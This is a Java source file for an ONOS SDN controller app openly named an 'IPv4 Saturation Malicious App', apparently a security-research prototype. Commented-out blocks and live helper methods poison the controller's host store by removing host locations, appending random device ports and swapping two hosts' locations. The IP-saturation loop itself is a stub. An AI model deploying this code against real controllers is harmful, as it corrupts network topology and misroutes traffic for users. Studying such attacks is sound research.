/*
 * Copyright 2022-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author edoardottt, https://www.edoardoottavianelli.it/
 */

package org.ipsaturation.app;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.host.HostStore;
import org.onosproject.net.Host;
import org.onosproject.net.HostId;
import org.onosproject.net.HostLocation;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.Device;
import org.onosproject.net.Port;
import java.util.Timer;
import java.util.Random;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.TimerTask;

/**
 * IPv4 Saturation Malicious App.
 */
@Component(immediate = true)
public class IpSaturation {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostStore hostStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceStore deviceStore;

    Timer timer = new Timer();
    TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            log.info("Time up, running Task!");
            editHostStore();
        }
    };

    // --------------------------------------------------------
    // CHANGE THIS PARAMETER TO TRIGGER THE APP EVERY X MILLISECONDS.
    // --------------------------------------------------------
    private static final long TIMEOUT = 10000;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.ipsaturation.app", () -> log.info("Periscope down."));
        // startTimer(TIMEOUT);
        editHostStore();
        log.info("Started ipsaturation App!");
    }

    @Deactivate
    protected void deactivate() {
        // timer.cancel();
        // timer.purge();
        log.info("Stopped ipsaturation App!");
    }

    // editHostStore mess up with the Host Data Store.
    private void editHostStore() {
        /*
         * // --- ORIGINAL CODE ---
         * getHosts();
         * HostId hId = pickRandomHost().id();
         * emptyLocation(hId);
         * DeviceId dId = pickRandomDevice().id();
         * List<Port> ports = deviceStore.getPorts(dId);
         * PortNumber pNumber = pickRandomPort(ports).number();
         * HostLocation hl = new HostLocation(dId, pNumber, 0);
         * hostStore.appendLocation(hId, hl);
         * log.info("Malicious Host Tracking App: Host {} connected to device {}",
         * hId.toString(), dId.toString());
         * getHosts();
         */

        /*
         * --- SWITCH LOCATIONS OF TWO HOSTS ---
         * getHosts();
         * HostId h1 = getHost(2).id();
         * HostId h4 = getHost(0).id();
         * getHosts();
         * log.info("Malicious Host Tracking App: Selected host {} and host {}", h1,
         * h4);
         * Set<HostLocation> locationsH4 = getLocations(h4);
         * Set<HostLocation> locationsH1 = getLocations(h1);
         * log.info("Malicious Host Tracking App: Locations {} and {}", locationsH1,
         * locationsH4);
         * HostLocation newLocationH4 = locationsH1.iterator().next();
         * HostLocation newLocationH1 = locationsH4.iterator().next();
         * hostStore.appendLocation(h4, newLocationH4);
         * hostStore.appendLocation(h1, newLocationH1);
         * log.info("Malicious Host Tracking App: Locations {} and {}",
         * getLocations(h1), getLocations(h4));
         * hostStore.removeLocation(h1, newLocationH4);
         * hostStore.removeLocation(h4, newLocationH1);
         * log.
         * info("Malicious Host Tracking App: Locations successfully poisoned: {} and {}"
         * , getLocations(h1),
         * getLocations(h4));
         */

        int startIp = 5;
        int ipPool = 100;
        String baseIp = "10.0.0.";

        for (int i = startIp; i <= ipPool; i++) {
            String chosenIp = baseIp + String.valueOf(i);
            // addHost(chosenIp);
        }
    }

    // addHost
    private void addHost(String ipAddress) {

    }

    // startTimer starts a timer that timeouts every X seconds.
    private void startTimer(long timeout) {
        timer.scheduleAtFixedRate(timerTask, 0, timeout);
    }

    private Set<HostLocation> getLocations(HostId hID) {
        Host h = hostService.getHost(hID);
        Set<HostLocation> locations = h.locations();
        return locations;
    }

    private void emptyLocation(HostId hID) {
        Host h = hostService.getHost(hID);
        Set<HostLocation> locations = h.locations();
        for (HostLocation location : locations) {
            hostStore.removeLocation(hID, location);
        }
    }

    // pickRandomHost picks a random host
    private Host pickRandomHost() {
        Iterable<Host> hosts = hostService.getHosts();
        Random rand = new Random();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(rand.nextInt(hostList.size()));

        return randomHost;
    }

    // getHost picks a random host
    private Host getHost(int i) {
        Iterable<Host> hosts = hostService.getHosts();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(i);

        return randomHost;
    }

    // getHosts
    private void getHosts() {
        Iterable<Host> hosts = hostService.getHosts();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        for (int i = 0; i < hostList.size(); i++) {
            log.info(hostList.get(i).toString());
        }
    }

    // pickRandomDevice picks a random device
    private Device pickRandomDevice() {
        Iterable<Device> devices = deviceService.getDevices();
        Random rand = new Random();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        Device randomDevice = deviceList.get(rand.nextInt(deviceList.size()));

        return randomDevice;
    }

    // getDeviceHosts() logs all the connected hosts for all the devices.
    private void getDeviceHosts() {
        Iterable<Device> devices = deviceService.getDevices();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        for (Device d : deviceList) {
            Set<Host> hosts = hostService.getConnectedHosts(d.id());
            log.info("Hosts connected to device {} : {}", d.id(), hosts.toString());
        }
    }

    // pickRandomPort picks a random port of a device
    private Port pickRandomPort(List<Port> ports) {
        Random rand = new Random();
        Port randomPort = ports.get(rand.nextInt(ports.size()));

        return randomPort;
    }
}
